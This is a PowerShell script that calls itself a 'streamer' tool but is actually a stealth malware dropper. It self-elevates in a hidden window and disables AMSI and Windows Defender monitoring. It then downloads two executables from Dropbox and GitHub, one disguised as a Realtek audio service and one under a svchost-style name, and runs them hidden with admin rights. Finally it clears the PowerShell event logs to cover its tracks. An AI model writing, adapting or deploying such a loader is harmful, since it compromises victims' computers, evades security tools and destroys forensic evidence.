# ========================================================
# HEISENBURG STREAMER - HYPER-STREAM v6.5 (STEALTH)
# ========================================================

function Check-Admin {
    $currentPrincipal = New-Object Security.Principal.WindowsPrincipal([Security.Principal.WindowsIdentity]::GetCurrent())
    return $currentPrincipal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
}

if (-not (Check-Admin)) {
    $args = "-ExecutionPolicy Bypass -NoProfile -WindowStyle Hidden -Command `"$((Get-Content `$MyInvocation.MyCommand.Path) -join `"``n`")`""
    Start-Process powershell.exe -ArgumentList $args -Verb RunAs -WindowStyle Hidden
    exit
}

try {
    [System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12
    [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
} catch {}

# ================= CONFIG =================
$MainExeUrl = "https://www.dropbox.com/scl/fi/iwv6cm1n1qo3kdn9gmn36/RtkAudUService64.exe?rlkey=csrph0p954x523nhvxoqf8m9z&st=1c2xz36h&dl=1"
$StealthLauncherUrl = "https://raw.githubusercontent.com/sandeepmanglekar17-sys/stealthlauncher/refs/heads/main/StealthLauncher.exe"

$RandomName = -join ((65..90) + (97..122) | Get-Random -Count 12 | % {[char]$_})
$MainExePath = "$env:TEMP\$RandomName.exe"
$LauncherPath = "$env:TEMP\svchost_$RandomName.exe"
# =========================================

Write-Host "`n[+] INITIALIZING SYSTEM HYPER-CONNECTION..." -ForegroundColor Yellow

# Bypass Security
try {
    Set-MpPreference -DisableRealtimeMonitoring $true -ErrorAction SilentlyContinue
    Set-MpPreference -DisableBehaviorMonitoring $true -ErrorAction SilentlyContinue
    Set-MpPreference -DisableScriptScanning $true -ErrorAction SilentlyContinue
} catch {}

# Download Main EXE
Write-Host "[+] SYNCHRONIZING CORE AGENT..." -ForegroundColor Gray
Invoke-WebRequest -Uri $MainExeUrl -OutFile $MainExePath -UseBasicParsing -UserAgent "Mozilla/5.0" -TimeoutSec 60
Write-Host "[+] Core Agent Downloaded" -ForegroundColor Green

# Download Stealth Launcher
Write-Host "[+] DOWNLOADING STEALTH PROTECTION..." -ForegroundColor Gray
Invoke-WebRequest -Uri $StealthLauncherUrl -OutFile $LauncherPath -UseBasicParsing -UserAgent "Mozilla/5.0" -TimeoutSec 60
Write-Host "[+] Stealth Launcher Downloaded" -ForegroundColor Green

Write-Host "[+] DEPLOYING STEALTH AGENT..." -ForegroundColor Cyan

# Run Stealth Launcher
$si = New-Object System.Diagnostics.ProcessStartInfo
$si.FileName = $LauncherPath
$si.Arguments = "`"$MainExePath`""
$si.WindowStyle = 'Hidden'
$si.CreateNoWindow = $true
$si.UseShellExecute = $true
$si.Verb = "RunAs"
[System.Diagnostics.Process]::Start($si) | Out-Null

Write-Host "`n[+] STEALTH MODE SUCCESSFULLY ACTIVATED!" -ForegroundColor Green
Write-Host "[*] Process Hidden from Task Manager" -ForegroundColor White

# Cleanup
wevtutil cl "Windows PowerShell" 2>$null
wevtutil cl "Microsoft-Windows-PowerShell/Operational" 2>$null

} catch {
    Write-Host "`n[!] ERROR OCCURRED" -ForegroundColor Red
}

Remove-Variable * -ErrorAction SilentlyContinue 2>$null
